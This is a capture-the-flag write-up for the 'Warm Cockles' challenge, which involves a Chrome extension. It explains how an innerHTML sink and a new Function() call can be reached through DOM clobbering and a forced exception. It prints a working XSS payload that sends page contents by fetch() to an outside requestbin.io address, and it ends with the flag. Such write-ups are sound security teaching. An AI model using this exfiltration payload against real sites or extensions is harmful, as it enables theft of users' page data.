# Warm Cockles
## 1000 Points // 2 Solves
_if someone provides the challenge description to me that would be highly welccome_

_didn't get the free char kway teow, very sad._
### Hints
- XSS
- There are several contexts in which you need to perform XSS. You need to exploit them all.
- ``dataset`` seems awfully empty for a dataset... maybe there was another reason why it was chosen

_You can access a our instance of the challenge here: http://de.irscybersec.tk:13337_

# Solution

## First Look
We know that this is a Chrome extension, so the first thing we need to do is install it. To install Google Chrome,
1. Navigate to https://chrome.com
2. Depending on whether you like being watched, turn on or off the checkmark to send telemetry data to Google
	* Note that this probably does not do anything anyways, resistance is futile
3. Click the Download button, or the translation of that in your preferred language
4. Double click (use the Mouse to click on the Icon two times in rapid succession) on the installer
5. Wait for the progress bar to reach completion
6. You now have Google Chrome installed

You can now decide that I'm an idiot and go to chrome://extensions, enable developer mode, and drag-and-drop the ``extensions`` folder into the window. The purpose of the extension should be very obvious the instant we go to a different website:

![Wow!! All the cockles](first-look.png)
_The extension converts any image found on the website to show a picture of warm cockles - how nice!_

This writeup will go over how to solve this challenge, and a few ways to debug Chrome extensions on the way.

## Peering into the Code™
### Server
The server in this case is pretty simple: it visits our page on ``/visit``, and there is a flag endpoint on a different port (``http://localhost:12345/hfqewfhq9hfeqe08fh9qwe8qw89r7098237q4589yuqowiearhfoaisdfaidlfh89ewry43.html``). However, before going to ``/visit``, the browser  opens the flag page in a different tab. Our objective, as stated, is to exfiltrate data from this page. Given that one of the hints was that it was an XSS attack, we most likely need to perform an XSS attack.

### Extension
This is where the vulnerability lies. We can see where the XSS will probably occur right off the bat in ``contentScript.js``:
```js
chrome.storage.onChanged.addListener(function(changes, namespace) {
	console.log(changes)
	var storageChange = changes.count;
	h1.innerHTML =  `Jamus Lim has served ${storageChange.newValue} warm cockles so far!`
});
```
Whenever an entry is updated in the Chrome extension storage API, an event that updates the total count on each page, which is unfiltered, is updated. This gives the very obvious attack vector of updating ``count`` in ``chrome.storage``.

Investigating further, we see that the value is only written to in line 60, to ``count``. Unfortunately, it was quickly determined that this was not a possible attack as ``count`` was only updated by the code itself by ``++``. This isn't Defcon so we will not be going into how to break V8 today.

Hence, we need to find another way to set the value, likely by RCE (is it RCE if I execute code locally?). JavaScript RCE usually occurs with ``eval`` or something similar, and here we have:

```js
catch (err) {
	// do something about the error in debug mode
	if (typeof debug !== "undefined") {
		new Function('return ' + debug.dataset.print)()(err)
		document.location = debug.dataset.cockles ? debug.dataset.cockles : "https://www.asiaone.com/sites/default/files/styles/a1_600x316/public/original_images/Jul2020/200708_jamus_facebook.jpg?h=c9f93661&itok=KFRKR2k2";
	} else {
		console.log(err);
	}
}
```

The ``new Function()`` block is vulnerable! We can control ``debug.dataset.print`` (next paragraph), so all we need to do is write a payload that sets this to ``chrome.storage.sync.set({count: `<XSS PAYLOAD>`});``. This would trigger the ``chrome.storage`` update event, leading to the XSS being written to the page.

How we control ``debug.dataset.print`` was given to us in a hint - the name ``dataset`` was not a random name, and was specially chosen for this challenge. The ``dataset`` property is used to access certain attributes in HTML attributes, [those beginning with ``data``](https://developer.mozilla.org/en-US/docs/Web/API/HTMLOrForeignElement/dataset). Using [Named Access on the ``window`` Object](https://html.spec.whatwg.org/multipage/window-object.html#named-access-on-the-window-object), we can create an element with ``id=debug`` and ``data-print=<XSS PAYLOAD>``. This part of the challenge is heavily based on existing web programming knowledge.

Unfortunately, there is one more hurdle to cross: the ``catch`` block is only run in an exception - how can we trigger an exception?

### Causing an Exception
To me, the code that stood out to me the most was:

```javascript
// get all <svg> tags
var svgs = document.getElementsByTagName("svg");
for(var i=0, l=svgs.length;i<l;i++) {
	svgs[i].innerHTML = `<image href="${cockles}" width="100%"/>`;
	svgs[i].setAttribute("preserveAspectRatio", "none");
	c += 1;
}

// get all <image> tags
var images = document.getElementsByTagName("image");
for(var i=0, l=svgs.length;i<l;i++) {
	images[i].href = cockles;
	c += 1;
}
```

The other loops were all programmed with the condition ``l<itself``, whereas this is with ``l<somethingelse``. This leads to the conclusion that if somehow, there were fewer ``<image>`` tags than ``<svg>`` tags, we could cause an exception when ``href`` of ``undefined`` is set.

However, how could there be fewer ``<image>`` than ``<svg>``s, when the content of each ``<svg>`` is set to have an ``<image>`` first?

My brain is wired to be stupid and I thought: what if I could delete the ``<svg>`` tag before we reach the for loop? Unfortunately for me, we were no longer stuck in the i386 days and computers were slightly faster than to allow that to cause a race condition. I tried setIntervals to find and delete any ``<image>`` tags, and MutationObservers, pitting two observers against each other. In both instancess, this led to the observer firing and the ``<image>`` tags being added back into the ``<svg>`` tags, which would then result in me deleting them again, and so on. Eventually, some of them did manage to set the XSS payload, but I always hit ``MAX_WRITE_OPERATIONS_PER_MINUTE``, meaning that Chrome did not allow me to write anything else to ``chrome.storage``.

Fortunately, there is a much more reliable and elegant way of causing an exception. ``<svg><image><svg></svg></image></svg>`` would be counted as 2 SVG elements existing, yet after the ``innerHTML`` of both are set, there will only be one ``<image>`` tag created, as the inner ``<svg>`` tag is overwritten. This means that the extension tries to set ``images[1].href`` even though ``images.length = 1``, causing an exception

### Payload
Now, all that's left is to write an XSS payload:
```html
<svg><image><svg></svg></image></svg> <!-- raise exception -->
<div id=debug data-print='_ => {document.body.innerHTML = ""; const a = "`https://requestbin.io/vy7m0ovy/?${document.body.innerHTML}`"; chrome.storage.sync.set({count: `<video src=qwer onerror="fetch(${a})">`}); document.location="http://127.0.0.1:12345/hfqewfhq9hfeqe08fh9qwe8qw89r7098237q4589yuqowiearhfoaisdfaidlfh89ewry43.html"}'</div>
```

Expanding the JavaScript:
```js
document.body.innerHTML = ""; // i think this prevented the infinite loop somehow?
const a = "`https://requestbin.io/vy7m0ovy/?${document.body.innerHTML}`"; // send the innerHTML of every page on which this executes to our bin, which would include the flag page
chrome.storage.sync.set({count: `<video src=qwer onerror="fetch(${a})">`}); // XSS payload - <script> cannot be used directly as innerHTML does not execute scripts
document.location="http://127.0.0.1:12345/hfqewfhq9hfeqe08fh9qwe8qw89r7098237q4589yuqowiearhfoaisdfaidlfh89ewry43.html" // redirect to flag page immediately after updating to prevent an infinite loop from forming
```

The flag will then be sent to the request bin.

# Flag
CTFSG{warm_cockles_now_become_cold_alr_lol}